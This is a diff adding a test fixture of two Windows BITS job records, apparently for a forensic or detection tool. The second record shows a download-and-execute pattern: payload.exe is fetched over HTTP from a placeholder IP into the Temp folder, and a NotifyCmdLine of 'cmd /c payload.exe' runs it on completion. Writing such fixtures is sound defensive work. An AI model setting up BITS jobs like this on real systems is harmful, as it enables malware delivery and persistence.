@@ -1,0 +1,32 @@
+JobId: job-bitsadmin
+JobGuid: {88888888-8888-8888-8888-888888888888}
+DisplayName: bitsadmin test
+Owner: alex
+OwnerSID: S-1-5-21-111-222-333-1001
+State: Transferred
+Type: Download
+Priority: Normal
+RemoteUrl: https://download.example.net/tool.zip
+LocalPath: C:\Users\alex\Downloads\tool.zip
+CreationTime: 2026-05-10T13:00:00+00:00
+ModificationTime: 2026-05-10T13:01:00+00:00
+TransferCompletionTime: 2026-05-10T13:02:00+00:00
+BytesTotal: 9000
+BytesTransferred: 9000
+
+JobId: job-bitsadmin-notify
+JobGuid: {99999999-9999-9999-9999-999999999999}
+DisplayName: bitsadmin notify
+Owner: alex
+OwnerSID: S-1-5-21-111-222-333-1001
+State: Transferred
+Type: Download
+Priority: Normal
+RemoteUrl: http://203.0.113.11/payload.exe
+LocalPath: C:\Users\alex\AppData\Local\Temp\payload.exe
+NotifyCmdLine: cmd /c payload.exe
+CreationTime: 2026-05-10T13:10:00+00:00
+ModificationTime: 2026-05-10T13:11:00+00:00
+TransferCompletionTime: 2026-05-10T13:12:00+00:00
+BytesTotal: 320000
+BytesTransferred: 320000
